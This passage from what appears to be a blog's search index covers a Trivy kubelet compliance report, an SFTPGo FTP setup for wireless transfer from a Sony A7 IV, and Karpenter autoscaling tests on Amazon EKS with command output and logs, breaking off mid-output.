2023-03-14T04:26:37Z Owner References: API Version: v1 Block Owner Deletion: false Controller: true Kind: Node Name: ip-192-168-12-204.ec2.internal UID: d74b3dc1-eed2-45e8-af14-b7ca8c49277a Resource Version: 113102 UID: c19ff166-d97c-4b16-94c2-17c39101cb69 Report: Checks: Category: Kubernetes Security Check Check ID: KCV0089 Description: Setup TLS connection on the Kubelets. Messages: Ensure that the --tls-key-file argument are set as appropriate Severity: CRITICAL Success: false Title: Ensure that the --tls-key-file argument are set as appropriate Category: Kubernetes Security Check Check ID: KCV0088 Description: Setup TLS connection on the Kubelets. Messages: Ensure that the --tls-cert-file argument are set as appropriate Severity: CRITICAL Success: false Title: Ensure that the --tls-cert-file argument are set as appropriate Category: Kubernetes Security Check Check ID: KCV0091 Description: Enable kubelet server certificate rotation. Messages: Verify that the RotateKubeletServerCertificate argument is set to true Severity: HIGH Success: false Title: Verify that the RotateKubeletServerCertificate argument is set to true Category: Kubernetes Security Check Check ID: KCV0079 Description: Disable anonymous requests to the Kubelet server. Messages: Ensure that the --anonymous-auth argument is set to false Severity: CRITICAL Success: false Title: Ensure that the --anonymous-auth argument is set to false Category: Kubernetes Security Check Check ID: KCV0092 Description: Ensure that the Kubelet is configured to only use strong cryptographic ciphers. Messages: Ensure that the Kubelet only makes use of Strong Cryptographic Ciphers Severity: CRITICAL Success: false Title: Ensure that the Kubelet only makes use of Strong Cryptographic Ciphers Category: Kubernetes Security Check Check ID: KCV0081 Description: Enable Kubelet authentication using certificates. Messages: Ensure that the --client-ca-file argument is set as appropriate Severity: CRITICAL Success: false Title: Ensure that the --client-ca-file argument is set as appropriate Category: Kubernetes Security Check Check ID: KCV0080 Description: Do not allow all requests. Enable explicit authorization. Messages: Ensure that the --authorization-mode argument is not set to AlwaysAllow Severity: HIGH Success: false Title: Ensure that the --authorization-mode argument is not set to AlwaysAllow Category: Kubernetes Security Check Check ID: KCV0082 Description: Disable the read-only port. Messages: Verify that the --read-only-port argument is set to 0 Severity: HIGH Success: false Title: Verify that the --read-only-port argument is set to 0 Category: Kubernetes Security Check Check ID: KCV0090 Description: Enable kubelet client certificate rotation. Messages: Ensure that the --rotate-certificates argument is not set to false Severity: HIGH Success: false Title: Ensure that the --rotate-certificates argument is not set to false Category: Kubernetes Security Check Check ID: KCV0083 Description: Protect tuned kernel parameters from overriding kubelet default kernel parameter values. Messages: Ensure that the --protect-kernel-defaults is set to true Severity: HIGH Success: false Title: Ensure that the --protect-kernel-defaults is set to true Scanner: Name: Trivy Vendor: Aqua Security Version: 0.12.1 Summary: Critical Count: 5 High Count: 5 Low Count: 0 Medium Count: 0 Events: &lt;none&gt; Grafana Add Trivy Grafana Dashboards to kube-prometheus-stack: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-trivy-operator-grafana.yml\" &lt;&lt; EOF grafana: dashboards: default: 17813-trivy-operator-dashboard: # renovate: depName=\"Trivy Operator Dashboard\" gnetId: 17813 revision: 2 datasource: Prometheus EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-trivy-operator-grafana.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack Add the following Grafana Dashboards to the existing kube-prometheus-stack Helm chart configuration: [16652] - Trivy Operator Dashboard Trivy Operator Dashboard [16742] - Trivy Image Vulnerability Overview Trivy Image Vulnerability Overview [16652] - Trivy Operator Reports Trivy Operator Reports Delete the previously created test namespaces: kubectl delete namespace test-trivy1 test-trivy2 test-trivy3 test-trivy4 || true Enjoy ‚Ä¶ üòâ" }, { "title": "Transfer photos wirelessly from Sony cameras", "url": "/posts/ftp-and-sony-camera/", "categories": "Photography, Cameras", "tags": "settings, photo, ftp, cameras, wireless", "date": "2023-01-15 00:00:00 +0100", "content": "FTP is a protocol I haven‚Äôt used for many years. Although I have configured FTP servers like vsftpd or ProFTPD in the past, this time I decided to explore SFTPGo. The main reason I wanted to run my own FTP server on my laptop was to transfer photos wirelessly from my Sony A7 IV camera, eliminating the need for cables or SD card swapping. SFTPGo Let‚Äôs look at how you can run the FTP server on macOS: Install SFTPGo: brew install sftpgo Create a test user and set up an admin account: sftpgo resetprovider --force --config-dir /usr/local/var/sftpgo cat &gt; /tmp/sftpgo-initprovider-data.json &lt;&lt; EOF { \"users\": [ { \"id\": 1, \"status\": 1, \"username\": \"test\", \"password\": \"test123\", \"home_dir\": \"${HOME}/Pictures/ftp\", \"uid\": 501, \"gid\": 20, \"permissions\": { \"/\": [ \"*\" ] } } ], \"folders\": [], \"admins\": [ { \"id\": 1, \"status\": 1, \"username\": \"admin\", \"password\": \"admin123\", \"permissions\": [ \"*\" ] } ] } EOF sftpgo initprovider --config-dir /usr/local/var/sftpgo --loaddata-from /tmp/sftpgo-initprovider-data.json Configure SFTPGo: cat &gt; /usr/local/etc/sftpgo/sftpgo.json &lt;&lt; EOF { \"ftpd\": { \"bindings\": [ { \"port\": 21 } ] }, \"httpd\": { \"bindings\": [ { \"port\": 7999 } ] }, \"sftpd\": { \"bindings\": [ { \"port\": 0 } ] } } EOF sudo brew services restart sftpgo Restart SFTPGo: sudo brew services restart sftpgo You can check the WebAdmin interface at http://127.0.0.1:8080/web/admin/users to see details about the created user. SFTPGo WebAdmin User SFTPGo WebAdmin Users Sony Camera FTP + WiFi settings Now, you need to configure your Sony camera (Sony A7 IV), connect it to your Wi-Fi network, and set up FTP transfer. Configure the Wi-Fi connection to your Access Point or wireless router. Alternatively, you can create a Personal Hotspot on your iPhone, as I did: flowchart LR A1[Network] --&gt; A2(Wi-Fi) --&gt; A3(Access Point Set.) --&gt; A4(...your WiFi AP...) Sony A7 IV WiFi AP Configuration Ensure your Mac is connected to the same Wi-Fi network as your Sony camera. Find your Mac‚Äôs local IP address by running the ifconfig command in the terminal: ‚ùØ ifconfig en0 ... inet 172.20.10.4 netmask ... ... Configure the FTP settings on your camera: flowchart LR A1[Network] --&gt; A2(Transfer/Remote) --&gt; A3(FTP Transfer Func) --&gt; A4(Server Setting) --&gt; A5(Server 1) A5 --&gt; B1(Display Name) --&gt; B2(SFTPGo) A5 --&gt; C1(Destination Settings) --&gt; C2(Hostname) --&gt; C3(172.20.10.4) C1 --&gt; D1(Port) --&gt; D2(21) A5 --&gt; E1(User Info Setting) --&gt; E2(User) --&gt; E3(test) E1 --&gt; F1(Password) --&gt; F2(test123) Enable FTP transfer on your camera: flowchart LR A1[Network] --&gt; A2(Transfer/Remote) --&gt; A3(FTP Transfer Func) --&gt; A4(FTP Function) --&gt; A5(On) B1[Network] --&gt; B2(Transfer/Remote) --&gt; B3(FTP Transfer Func) --&gt; B4(FTP Power Save) --&gt; B5(On) Sony A7 IV FTP Configuration Initiate the FTP transfer to copy photos from your camera to your Mac: flowchart LR A1[Network] --&gt; A2(Transfer/Remote) --&gt; A3(FTP Transfer Func) --&gt; A4(FTP Transfer) --&gt; A5(OK) Sony A7 IV FTP Transfer The camera configuration process, including Wi-Fi setup, FTP settings, and photo transfer, can be viewed in the video Transfer photos wirelessly from Sony Cameras: Enjoy ‚Ä¶ üòâ" }, { "title": "Amazon EKS - Karpenter tests", "url": "/posts/amazon-eks-karpenter-tests/", "categories": "Kubernetes, Amazon EKS, Karpenter", "tags": "Amazon EKS, k8s, kubernetes, karpenter, eksctl", "date": "2022-12-24 00:00:00 +0100", "content": "In the previous post, ‚ÄúCheapest Amazon EKS‚Äù, I described installing Karpenter to improve the efficiency and cost-effectiveness of running workloads on the cluster. Many articles describe what Karpenter is, how it works, and the benefits of using it. Here are a few notes from my testing, demonstrating how it works with real-world examples. Requirements An Amazon EKS cluster with Karpenter configured as described in ‚ÄúCheapest Amazon EKS‚Äù Helm The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Install tools Install the following handy tools: eks-node-viewer viewnode kubectl-view-allocations kube-capacity ARCH=\"amd64\" curl -sL \"https://github.com/kubernetes-sigs/krew/releases/download/v0.4.5/krew-linux_${ARCH}.tar.gz\" | tar -xvzf - -C \"${TMP_DIR}\" --no-same-owner --strip-components=1 --wildcards \"*/krew-linux*\" \"${TMP_DIR}/krew-linux_${ARCH}\" install krew rm \"${TMP_DIR}/krew-linux_${ARCH}\" export PATH=\"${HOME}/.krew/bin:${PATH}\" kubectl krew install resource-capacity view-allocations viewnode Workloads Let‚Äôs run some example workloads to observe how Karpenter functions. Consolidation example Start amd64 nginx pods in the test-karpenter namespace: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-deployment-nginx.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: v1 kind: Namespace metadata: name: test-karpenter --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment namespace: test-karpenter spec: selector: matchLabels: app: nginx replicas: 2 template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx resources: requests: cpu: 500m memory: 16Mi affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: managedBy operator: In values: - karpenter - key: provisioner operator: In values: - default nodeSelector: kubernetes.io/arch: amd64 EOF kubectl wait --for=condition=Available=True --timeout=5m --namespace=test-karpenter deployment nginx-deployment Karpenter will start a new t3a.small spot EC2 instance ip-192-168-66-142.ec2.internal: kubectl view-allocations --namespace test-karpenter --utilization --resource-name=memory --resource-name=cpu Resource Utilization Requested Limit Allocatable Free cpu (3%) 194.0m (17%) 1.0 __ 5.8 4.8 ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ __ __ 1.9 __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ __ __ 1.9 __ ‚îî‚îÄ ip-192-168-66-142.ec2.internal (0%) 2.0m (52%) 1.0 __ 1.9 930.0m ‚îú‚îÄ nginx-deployment-589b44547-6k82l 1.0m 500.0m __ __ __ ‚îî‚îÄ nginx-deployment-589b44547-ssp97 1.0m 500.0m __ __ __ memory (20%) 1.5Gi (0%) 32.0Mi __ 7.9Gi 7.9Gi ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ __ __ 3.2Gi __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ __ __ 3.2Gi __ ‚îî‚îÄ ip-192-168-66-142.ec2.internal (0%) 5.3Mi (2%) 32.0Mi __ 1.5Gi 1.4Gi ‚îú‚îÄ nginx-deployment-589b44547-6k82l 2.6Mi 16.0Mi __ __ __ ‚îî‚îÄ nginx-deployment-589b44547-ssp97 2.7Mi 16.0Mi __ __ __ Karpenter logs: kubectl logs -n karpenter --since=2m -l app.kubernetes.io/name=karpenter Outputs: ... 2023-01-29T18:35:16.902Z DEBUG controller.provisioner 390 out of 599 instance types were excluded because they would breach provisioner limits {\"commit\": \"5a7faa0-dirty\"} 2023-01-29T18:35:16.905Z INFO controller.provisioner found provisionable pod(s) {\"commit\": \"5a7faa0-dirty\", \"pods\": 2} 2023-01-29T18:35:16.905Z INFO controller.provisioner computed new node(s) to fit pod(s) {\"commit\": \"5a7faa0-dirty\", \"newNodes\": 1, \"pods\": 2} 2023-01-29T18:35:16.905Z INFO controller.provisioner launching node with 2 pods requesting {\"cpu\":\"1155m\",\"memory\":\"152Mi\",\"pods\":\"7\"} from types t3a.xlarge, t3a.2xlarge, t3a.small, t3a.medium, t3a.large {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\"} 2023-01-29T18:35:17.352Z DEBUG controller.provisioner.cloudprovider created launch template {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\", \"launch-template-name\": \"Karpenter-k01-2845501446139737819\", \"launch-template-id\": \"lt-0a4dbdf22b4e80f45\"} 2023-01-29T18:35:19.382Z INFO controller.provisioner.cloudprovider launched new instance {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\", \"id\": \"i-059d06b02509680a0\", \"hostname\": \"ip-192-168-66-142.ec2.internal\", \"instance-type\": \"t3a.small\", \"zone\": \"us-east-1a\", \"capacity-type\": \"spot\"} Increase the replica count to 5. This will prompt Karpenter to add a new spot worker node to run the 3 additional nginx pods: kubectl scale deployment nginx-deployment --namespace test-karpenter --replicas 5 kubectl wait --for=condition=Available=True --timeout=5m --namespace test-karpenter deployment nginx-deployment Check the details: kubectl view-allocations --namespace test-karpenter --utilization --resource-name=memory --resource-name=cpu Resource Utilization Requested Limit Allocatable Free cpu (3%) 208.0m (32%) 2.5 __ 7.7 5.2 ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ __ __ 1.9 __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ __ __ 1.9 __ ‚îú‚îÄ ip-192-168-66-142.ec2.internal (0%) 3.0m (78%) 1.5 __ 1.9 430.0m ‚îÇ ‚îú‚îÄ nginx-deployment-589b44547-6k82l 1.0m 500.0m __ __ __ ‚îÇ ‚îú‚îÄ nginx-deployment-589b44547-ssp97 1.0m 500.0m __ __ __ ‚îÇ ‚îî‚îÄ nginx-deployment-589b44547-x7bvl 1.0m 500.0m __ __ __ ‚îî‚îÄ ip-192-168-94-105.ec2.internal (0%) 2.0m (52%) 1.0 __ 1.9 930.0m ‚îú‚îÄ nginx-deployment-589b44547-5jhkb 1.0m 500.0m __ __ __ ‚îî‚îÄ nginx-deployment-589b44547-vjzns 1.0m 500.0m __ __ __ memory (18%) 1.7Gi (1%) 80.0Mi __ 9.4Gi 9.3Gi ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ __ __ 3.2Gi __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ __ __ 3.2Gi __ ‚îú‚îÄ ip-192-168-66-142.ec2.internal (1%) 8.0Mi (3%) 48.0Mi __ 1.5Gi 1.4Gi ‚îÇ ‚îú‚îÄ nginx-deployment-589b44547-6k82l 2.6Mi 16.0Mi __ __ __ ‚îÇ ‚îú‚îÄ nginx-deployment-589b44547-ssp97 2.7Mi 16.0Mi __ __ __ ‚îÇ ‚îî‚îÄ nginx-deployment-589b44547-x7bvl 2.7Mi 16.0Mi __ __ __ ‚îî‚îÄ ip-192-168-94-105.ec2.internal (0%) 5.3Mi (2%) 32.0Mi __ 1.5Gi 1.4Gi ‚îú‚îÄ nginx-deployment-589b44547-5jhkb 2.7Mi 16.0Mi __ __ __ ‚îî‚îÄ nginx-deployment-589b44547-vjzns 2.6Mi 16.0Mi __ __ __ Karpenter logs: kubectl logs -n karpenter --since=2m -l app.kubernetes.io/name=karpenter Outputs: ... 2023-01-29T18:38:07.389Z DEBUG controller.provisioner 391 out of 599 instance types were excluded because they would breach provisioner limits {\"commit\": \"5a7faa0-dirty\"} 2023-01-29T18:38:07.392Z INFO controller.provisioner found provisionable pod(s) {\"commit\": \"5a7faa0-dirty\", \"pods\": 2} 2023-01-29T18:38:07.392Z INFO controller.provisioner computed new node(s) to fit pod(s) {\"commit\": \"5a7faa0-dirty\", \"newNodes\": 1, \"pods\": 2} 2023-01-29T18:38:07.392Z INFO controller.provisioner launching node with 2 pods requesting {\"cpu\":\"1155m\",\"memory\":\"152Mi\",\"pods\":\"7\"} from types t3a.medium, t3a.large, t3a.xlarge, t3a.2xlarge, t3a.small {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\"} 2023-01-29T18:38:09.682Z INFO controller.provisioner.cloudprovider launched new instance {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\", \"id\": \"i-008c19ef038857a28\", \"hostname\": \"ip-192-168-94-105.ec2.internal\", \"instance-type\": \"t3a.small\", \"zone\": \"us-east-1a\", \"capacity-type\": \"spot\"} If the number of replicas is reduced to 3, Karpenter will determine that the workload running on two spot nodes can be consolidated onto a single node: kubectl scale deployment nginx-deployment --namespace test-karpenter --replicas 3 kubectl wait --for=condition=Available=True --timeout=5m --namespace test-karpenter deployment nginx-deployment sleep 20 Thanks to the consolidation feature (described in the ‚ÄúAWS re:Invent 2022 - Kubernetes virtually anywhere, for everyone‚Äù talk), the logs will look like this: kubectl logs -n karpenter --since=2m -l app.kubernetes.io/name=karpenter ... 2023-01-29T18:41:03.918Z INFO controller.deprovisioning deprovisioning via consolidation delete, terminating 1 nodes ip-192-168-66-142.ec2.internal/t3a.small/spot {\"commit\": \"5a7faa0-dirty\"} 2023-01-29T18:41:03.982Z INFO controller.termination cordoned node {\"commit\": \"5a7faa0-dirty\", \"node\": \"ip-192-168-66-142.ec2.internal\"} 2023-01-29T18:41:06.715Z INFO controller.termination deleted node {\"commit\": \"5a7faa0-dirty\", \"node\": \"ip-192-168-66-142.ec2.internal\"} Check the details: kubectl view-allocations --namespace test-karpenter --utilization --resource-name=memory --resource-name=cpu Resource Utilization Requested Limit Allocatable Free cpu (2%) 121.0m (26%) 1.5 __ 5.8 4.3 ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ __ __ 1.9 __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ __ __ 1.9 __ ‚îî‚îÄ ip-192-168-94-105.ec2.internal (0%) 3.0m (78%) 1.5 __ 1.9 430.0m ‚îú‚îÄ nginx-deployment-589b44547-5jhkb 1.0m 500.0m __ __ __ ‚îú‚îÄ nginx-deployment-589b44547-lnskq 1.0m 500.0m __ __ __ ‚îî‚îÄ nginx-deployment-589b44547-vjzns 1.0m 500.0m __ __ __ memory (20%) 1.6Gi (1%) 48.0Mi __ 7.9Gi 7.9Gi ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ __ __ 3.2Gi __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ __ __ 3.2Gi __ ‚îî‚îÄ ip-192-168-94-105.ec2.internal (1%) 8.0Mi (3%) 48.0Mi __ 1.5Gi 1.4Gi ‚îú‚îÄ nginx-deployment-589b44547-5jhkb 2.7Mi 16.0Mi __ __ __ ‚îú‚îÄ nginx-deployment-589b44547-lnskq 2.6Mi 16.0Mi __ __ __ ‚îî‚îÄ nginx-deployment-589b44547-vjzns 2.6Mi 16.0Mi __ __ __ Remove the nginx workload and the test-karpenter namespace: kubectl delete namespace test-karpenter || true Simple autoscaling It would be helpful to document a standard autoscaling example, including all relevant outputs and logs. Install the podinfo Helm chart and modify its default values: # renovate: datasource=helm depName=podinfo registryUrl=https://stefanprodan.github.io/podinfo PODINFO_HELM_CHART_VERSION=\"6.5.4\" helm repo add --force-update sp https://stefanprodan.github.io/podinfo cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-podinfo.yml\" &lt;&lt; EOF ingress: enabled: true className: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stefanprodan/podinfo/gh-pages/cuddle_bunny.gif forecastle.stakater.com/appName: Podinfo hosts: - host: podinfo.${CLUSTER_FQDN} paths: - path: / pathType: ImplementationSpecific tls: - hosts: - podinfo.${CLUSTER_FQDN} resources: requests: cpu: 1 memory: 16Mi EOF helm upgrade --install --version \"${PODINFO_HELM_CHART_VERSION}\" --namespace podinfo --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-podinfo.yml\" podinfo sp/podinfo Check cluster and node details: kubectl get nodes -o wide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME ip-192-168-14-250.ec2.internal Ready &lt;none&gt; 46h v1.24.9-eks-4f83af2 192.168.14.250 54.158.242.60 Bottlerocket OS 1.12.0 (aws-k8s-1.24) 5.15.79 containerd://1.6.15+bottlerocket ip-192-168-16-172.ec2.internal Ready &lt;none&gt; 46h v1.24.9-eks-4f83af2 192.168.16.172 3.90.15.21 Bottlerocket OS 1.12.0 (aws-k8s-1.24) 5.15.79 containerd://1.6.15+bottlerocket ip-192-168-84-230.ec2.internal Ready &lt;none&gt; 79s v1.24.9-eks-4f83af2 192.168.84.230 &lt;none&gt; Bottlerocket OS 1.12.0 (aws-k8s-1.24) 5.15.79 containerd://1.6.15+bottlerocket Display details about node instance types and architectures: kubectl get nodes -o json | jq -Cjr '.items[] | .metadata.name,\" \",.metadata.labels.\"node.kubernetes.io/instance-type\",\" \",.metadata.labels.\"kubernetes.io/arch\", \"\\n\"' | sort -k2 -r | column -t ip-192-168-84-230.ec2.internal t4g.small arm64 ip-192-168-16-172.ec2.internal t4g.medium arm64 ip-192-168-14-250.ec2.internal t4g.medium arm64 View details about node capacity: kubectl resource-capacity --sort cpu.util --util --pod-count NODE CPU REQUESTS CPU LIMITS CPU UTIL MEMORY REQUESTS MEMORY LIMITS MEMORY UTIL POD COUNT * 3285m (56%) 3500m (60%) 417m (7%) 2410Mi (30%) 6840Mi (85%) 3112Mi (39%) 36/45 ip-192-168-14-250.ec2.internal 715m (37%) 1300m (67%) 299m (15%) 750Mi (22%) 2404Mi (72%) 1635Mi (49%) 17/17 ip-192-168-16-172.ec2.internal 1415m (73%) 1900m (98%) 82m (4%) 1524Mi (46%) 3668Mi (111%) 1024Mi (31%) 13/17 ip-192-168-84-230.ec2.internal 1155m (59%) 300m (15%) 37m (1%) 136Mi (9%) 768Mi (55%) 453Mi (32%) 6/11 A graphical view of CPU and memory utilization per node (including pricing information), produced by eks-node-viewer: eks-node-viewer --resources cpu,memory 3 nodes 3285m/5790m 56.7% cpu ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 0.067/hour $49.056/month 2410Mi/8163424Ki 30.2% memory ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 36 pods (0 pending 36 running 36 bound) ip-192-168-16-172.ec2.internal cpu ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 73% (13 pods) t4g.medium/$0.034 On-Demand - Ready memory ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 46% ip-192-168-14-250.ec2.internal cpu ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 37% (17 pods) t4g.medium/$0.034 On-Demand - Ready memory ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 23% ip-192-168-84-230.ec2.internal cpu ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 60% (6 pods) t4g.small Spot - Ready memory ‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 10% Other details, produced by viewnode: kubectl viewnode --all-namespaces --show-metrics 36 pod(s) in total 0 unscheduled pod(s) 3 running node(s) with 36 scheduled pod(s): - ip-192-168-14-250.ec2.internal running 17 pod(s) (linux/arm64/containerd://1.6.15+bottlerocket | mem: 1.6 GiB) * external-dns: external-dns-7d5dfdc9bc-dwf2j (running | mem usage: 22.1 MiB) * forecastle: forecastle-fd9fbf494-mz78d (running | mem usage: 8.4 MiB) * ingress-nginx: ingress-nginx-controller-5c58df8c6f-5qtsj (running | mem usage: 77.9 MiB) * kube-prometheus-stack: alertmanager-kube-prometheus-stack-alertmanager-0 (running | mem usage: 20.8 MiB) * kube-prometheus-stack: kube-prometheus-stack-kube-state-metrics-75b97d7857-4q29f (running | mem usage: 15.3 MiB) * kube-prometheus-stack: kube-prometheus-stack-operator-c4576c8c5-lv9tj (running | mem usage: 33.6 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-grtqf (running | mem usage: 10.1 MiB) * kube-prometheus-stack: prometheus-kube-prometheus-stack-prometheus-0 (running | mem usage: 607.1 MiB) * kube-system: aws-node-m8bqr (running | mem usage: 30.9 MiB) * kube-system: aws-node-termination-handler-4d4vt (running | mem usage: 12.8 MiB) * kube-system: ebs-csi-controller-fd8649d65-dzr77 (running | mem usage: 54.8 MiB) * kube-system: ebs-csi-node-lnhz4 (running | mem usage: 20.9 MiB) * kube-system: kube-proxy-snhd4 (running | mem usage: 13.3 MiB) * kube-system: metrics-server-7bf7496f67-hg8dt (running | mem usage: 17.7 MiB) * mailhog: mailhog-7fd4cdc758-c6pht (running | mem usage: 4.0 MiB) * oauth2-proxy: oauth2-proxy-c74b9b769-7fx6m (running | mem usage: 8.4 MiB) * wiz: wiz-kubernetes-connector-broker-5d8fcfdb94-nq2lw (running | mem usage: 6.1 MiB) - ip-192-168-16-172.ec2.internal running 13 pod(s) (linux/arm64/containerd://1.6.15+bottlerocket | mem: 1.0 GiB) * cert-manager: cert-manager-7fb84796f4-mmp7g (running | mem usage: 30.7 MiB) * cert-manager: cert-manager-cainjector-7f694c4c58-s5f4s (running | mem usage: 33.8 MiB) * cert-manager: cert-manager-webhook-7cd8c769bb-5cr5d (running | mem usage: 11.5 MiB) * karpenter: karpenter-7b786469d4-s52fc (running | mem usage: 151.8 MiB) * kube-prometheus-stack: kube-prometheus-stack-grafana-b45c4f79-h67r8 (running | mem usage: 221.3 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-gtgv7 (running | mem usage: 9.3 MiB) * kube-system: aws-node-4d64v (running | mem usage: 28.0 MiB) * kube-system: aws-node-termination-handler-v9jpw (running | mem usage: 12.0 MiB) * kube-system: coredns-79989457d9-9bz5s (running | mem usage: 15.8 MiB) * kube-system: coredns-79989457d9-pv2gz (running | mem usage: 15.0 MiB) * kube-system: ebs-csi-controller-fd8649d65-pllkv (running | mem usage: 56.1 MiB) * kube-system: ebs-csi-node-cffz8 (running | mem usage: 19.3 MiB) * kube-system: kube-proxy-zvnhr (running | mem usage: 12.2 MiB) - ip-192-168-84-230.ec2.internal running 6 pod(s) (linux/arm64/containerd://1.6.15+bottlerocket | mem: 454.4 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-pd8qx (running | mem usage: 7.3 MiB) * kube-system: aws-node-4c49x (running | mem usage: 24.2 MiB) * kube-system: aws-node-termination-handler-dsd64 (running | mem usage: 11.6 MiB) * kube-system: ebs-csi-node-s7b85 (running | mem usage: 15.7 MiB) * kube-system: kube-proxy-2gblp (running | mem usage: 12.7 MiB) * podinfo: podinfo-59d6468db-jmwxh (running | mem usage: 13.4 MiB) Further details, produced by kubectl-view-allocations: kubectl view-allocations --utilization Resource Utilization Requested Limit Allocatable Free attachable-volumes-aws-ebs __ __ __ 117.0 __ ‚îú‚îÄ ip-192-168-14-250.ec2.internal __ __ __ 39.0 __ ‚îú‚îÄ ip-192-168-16-172.ec2.internal __ __ __ 39.0 __ ‚îî‚îÄ ip-192-168-84-230.ec2.internal __ __ __ 39.0 __ cpu (3%) 183.0m (57%) 3.3 (60%) 3.5 5.8 2.3 ‚îú‚îÄ ip-192-168-14-250.ec2.internal (6%) 122.0m (37%) 715.0m (67%) 1.3 1.9 630.0m ‚îÇ ‚îú‚îÄ alertmanager-kube-prometheus-stack-alertmanager-0 2.0m 200.0m 200.0m __ __ ‚îÇ ‚îú‚îÄ aws-node-m8bqr 2.0m 25.0m __ __ __ ‚îÇ ‚îú‚îÄ aws-node-termination-handler-4d4vt 1.0m __ __ __ __ ‚îÇ ‚îú‚îÄ 